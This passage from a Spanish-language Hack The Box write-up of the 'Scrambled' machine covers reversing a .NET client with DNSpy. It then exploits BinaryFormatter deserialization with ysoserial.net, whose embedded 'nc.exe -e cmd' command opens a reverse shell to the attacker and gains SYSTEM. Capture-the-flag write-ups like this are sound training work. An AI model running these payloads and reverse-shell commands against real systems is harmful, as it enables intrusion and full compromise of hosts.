Una vez que lo tengas instalado, vuelve a probar el **cmdlet Enter-PSSession**:
```bash
pwsh
PowerShell 7.2.6
Copyright (c) Microsoft Corporation.

https://aka.ms/powershell
Type 'help' to get help.

PS ../Scrambled/OSCP_Style/content> Enter-PSSession dc1.scrm.local -Credential MiscSvc

PowerShell credential request
Enter your credentials.                                                                                                                                             
Password for user MiscSvc: *****************

Enter-PSSession: Connecting to remote server dc1.scrm.local failed with the following error message : Authorization failed For more information, see the about_Remote_Troubleshooting Help topic.
```
Y en mi caso no funciono, no sé por qué razón no me da acceso, pero puede que a ti te funcione y es una opción que puedes probar en otras máquinas que sean **AD**.

### Analizando Binario y DLL con DNSpy {#DNSpy}

Si recordamos cuando entramos al **servicio SMB vía Kerberos**, vimos varios archivos compartidos. 

Podemos listarlos en nuestra sesión como el **usuario MiscSvc** (en mi caso, me quedé con la sesión de **Evil-WinRM**):
```batch
*Evil-WinRM* PS C:\> cd Shares
*Evil-WinRM* PS C:\Shares> dir

    Directory: C:\Shares

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----        11/1/2021   3:21 PM                HR
d-----        11/3/2021   7:32 PM                IT
d-----        11/1/2021   3:21 PM                Production
d-----        11/4/2021  10:23 PM                Public
d-----        11/3/2021   7:33 PM                Sales
```

Bien, podemos ir listando uno por uno, pero donde está lo interesante, es en el directorio `IT/Apps/Sales Order Client`:
```batch
*Evil-WinRM* PS C:\Shares\IT\Apps\Sales Order Client> dir

    Directory: C:\Shares\IT\Apps\Sales Order Client

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----        11/5/2021   8:52 PM          86528 ScrambleClient.exe
-a----        11/5/2021   8:52 PM          19456 ScrambleLib.dll
```

Vamos a descargar ese **binario y el archivo DLL**:
```batch
*Evil-WinRM* PS C:\Shares\IT\Apps\Sales Order Client> download ScrambleClient.exe
                                        
Info: Downloading C:\Shares\IT\Apps\Sales Order Client\ScrambleClient.exe to ScrambleClient.exe
                                        
Info: Download successful!
*Evil-WinRM* PS C:\Shares\IT\Apps\Sales Order Client> download ScrambleLib.dll
                                        
Info: Downloading C:\Shares\IT\Apps\Sales Order Client\ScrambleLib.dll to ScrambleLib.dll
                                        
Info: Download successful!
```

Una vez descargados, vamos a mandarlos a una **máquina virtual Windows 10** para ver cómo funcionan. Puedes hacerlo levantando un servidor en **Python**.

-----------
**IMPORTANTE**:

Te recomiendo que mandes la **VPN de HTB**, la habilites con el **cliente de OpenVPN** y configures el dominio y el servidor del dominio en el `/etc/hosts` del **Windows 10**, para que funcione correctamente el binario.

----------

<p align="center">
<img src="/assets/images/htb-writeup-scrambled/Captura7.png">
</p>

Probemos nuestra conexión con la máquina víctima:

<p align="center">
<img src="/assets/images/htb-writeup-scrambled/Captura8.png">
</p>

Funciona correctamente.

Si abrimos el binario, veremos los mismos campos que vimos en la página web.

<p align="center">
<img src="/assets/images/htb-writeup-scrambled/Captura9.png">
</p>

Dale al botón de **edit** y verás que podemos configurar el servidor del dominio y que se ejecuta en el **puerto 4411**. Además, podemos habilitar una casilla para activar el debugging de los logs:

<p align="center">
<img src="/assets/images/htb-writeup-scrambled/Captura10.png">
</p>

Veamos qué pasa si con **netcat** nos conectamos a ese puerto:
```bash
nc 10.10.11.168 4411
SCRAMBLECORP_ORDERS_V1.0.3;
hola
ERROR_UNKNOWN_COMMAND;
help
ERROR_UNKNOWN_COMMAND;
^C
```
Por lo que veo, nos pide un comando que desconocemos por ahora.

Vamos a jugar para ver qué pasa si ponemos los usuarios y contraseñas que ya tenemos:

<p align="center">
<img src="/assets/images/htb-writeup-scrambled/Captura11.png">
</p>

<p align="center">
<img src="/assets/images/htb-writeup-scrambled/Captura12.png">
</p>

<p align="center">
<img src="/assets/images/htb-writeup-scrambled/Captura13.png">
</p>

No nos dejó conectar con ninguno, pero se registró algo en un archivo de logs que se generó por el uso del binario. Quiero pensar que esto pasó por activar esa casilla de debugging:

<p align="center">
<img src="/assets/images/htb-writeup-scrambled/Captura14.png">
</p>

Podemos ver que sucedieron muchas cosas, por ejemplo, se intenta hacer la conexión hacia el **servidor SCRAMBLECORP_ORDERS_V1.0.3** usando las credenciales que pusimos, pero ninguno se pudo conectar:

<p align="center">
<img src="/assets/images/htb-writeup-scrambled/Captura15.png">
</p>

Vamos a analizar el binario con **DNSpy**:

<p align="center">
<img src="/assets/images/htb-writeup-scrambled/Captura16.png">
</p>

Hay muchas cosillas que podemos encontrar aquí, por ejemplo, la clase que realiza el login desde la ventana:

<p align="center">
<img src="/assets/images/htb-writeup-scrambled/Captura17.png">
</p>

También vemos la clase que genera el archivo con los logs:

<p align="center">
<img src="/assets/images/htb-writeup-scrambled/Captura18.png">
</p>

Pero, por más que busquemos, no hay algo que de verdad nos ayude, así que vamos a ver el **archivo DLL**:

<p align="center">
<img src="/assets/images/htb-writeup-scrambled/Captura19.png">
</p>

Si analizamos su contenido, encontraremos cosas críticas, por ejemplo, una clase que está aplicando una **serialización y deserialización** siendo ambas en **base64**:

<p align="center">
<img src="/assets/images/htb-writeup-scrambled/Captura20.png">
</p>

Entiendo que se está serializando una orden creada y luego se deserializa una orden recibida, ósea que si creamos una orden, esta se va a serializar, pero si recibimos una orden, esta se va a deserializar.

Si revisamos la **clase ScrambleNetClient**, vamos a encontrar algo muy curioso:

<p align="center">
<img src="/assets/images/htb-writeup-scrambled/Captura21.png">
</p>

Resulta que es un usuario de algún dev, que al usarlo, nos va a dar acceso al servidor como si fuera un Bypass.

Vamos a usar ese usuario, sin ponerle contraseña, y veamos qué pasa:

<p align="center">
<img src="/assets/images/htb-writeup-scrambled/Captura22.png">
</p>

Excelente, parece que ya hay órdenes creadas y recibidas.

Parece que tenemos la opción de crear una orden:

<p align="center">
<img src="/assets/images/htb-writeup-scrambled/Captura23.png">
</p>

Probemos a crear una orden random y después, veamos los logs para ver si lo que entendimos que hace el binario es cierto:

<p align="center">
<img src="/assets/images/htb-writeup-scrambled/Captura24.png">
</p>

<p align="center">
<img src="/assets/images/htb-writeup-scrambled/Captura25.png">
</p>

Muy bien, es correcto lo que vimos que pasa. Nuestra orden se serializó y se envió, las otras órdenes que llegaron, fueron deserializadas para poder ver su contenido.

También, vemos que hay varios comandos como **LIST_ORDERS, SUCCESS y UPLOAD_ORDER**, creo que no hace falta explicar qué hace cada una.

Entonces, se están usando estos comandos junto a un código en **base64 serializado** en el **servidor SCRAMBLECORP_ORDERS_V1.0.3**, para realizar acciones entre el binario y el servidor.

Podemos aprovecharnos de esto para ganar acceso a la máquina.

### Aplicando Ataque de Deserialización con ysoserial {#ysoserial}

¿Qué es un Ataque de Deserialización?

| **Ataque de Deserialización** |
|:-----------:|
| *Un ataque de deserialización ocurre cuando un atacante aprovecha la deserialización insegura de datos en una aplicación. La deserialización es el proceso mediante el cual los datos se transforman de un formato serializado (como JSON, XML, o binario) en un objeto en memoria que pueda ser manipulado por un programa.* |

Si una aplicación deserializa objetos sin validar adecuadamente los datos entrantes, un atacante podría enviar datos manipulados para:
* Ejecutar código arbitrario.
* Modificar el estado del objeto.
* Escalar privilegios.

La idea, es que vamos a serializar un comando que va a ejecutar el binario **netcat** para obtener una sesión, ya que suponemos que el dueño del servidor es el administrador.

Para realizar esto, necesitamos la herramienta ysoserial que puedes descargar desde aquí (solo para usar en **Windows**)
* <a href="https://github.com/pwntester/ysoserial.net" target="_blank">Repositorio de pwntester: ysoserial.net</a>

Tan solo ve a los releases y obtén el comprimido, descomprímelo y abre una cmd en **Windows** para usar el **ysoserial**:

<p align="center">
<img src="/assets/images/htb-writeup-scrambled/Captura26.png">
</p>

Debemos indicarle el gadget (sería **WindowsIdentity**), la clase de formato (sería **BinaryFormatter**, el mismo que usa el binario), cómo será el output (sería **base64**) y, por último, el comando a ejecutar.

Hagamoslo:
```batch
ysoserial.exe -g WindowsIdentity -f BinaryFormatter -o base64 -c "C:\Temp\nc.exe -e cmd Tu_IP 443"
AAEAAAD///....
```

Abre una **netcat con rlwrap**:
```bash
rlwrap nc -nlvp 443
listening on [any] 443 ...
```

Abre otra **netcat** apuntando al servidor:
```bash
nc 10.10.11.168 4411
SCRAMBLECORP_ORDERS_V1.0.3;
```

Copia el código resultante en la **netcat** del servidor, agrégale el comando `UPLOAD_ORDER;` y ejecútalo:
```bash
nc 10.10.11.168 4411
SCRAMBLECORP_ORDERS_V1.0.3;
UPLOAD_ORDER;AAEAAAD///....
...
...

```
Aunque te marque un error, el comando sí se ejecutó.

Ve el resultado:
```bash
rlwrap nc -nlvp 443
listening on [any] 443 ...
connect to [Tu_IP] from (UNKNOWN) [10.10.11.168] 61214
Microsoft Windows [Version 10.0.17763.2989]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
whoami
nt authority\system
```

Y listo, ya con esto completamos la máquina.

Si bien podemos usar el **JuicyPotatonNG** para escalar privilegios siendo el **usuario sqlsvc**, en mi caso no se pudo.

No sé si porque hayan inhabilitado esta opción o porque no funciona, pero de que se podía, se podía.
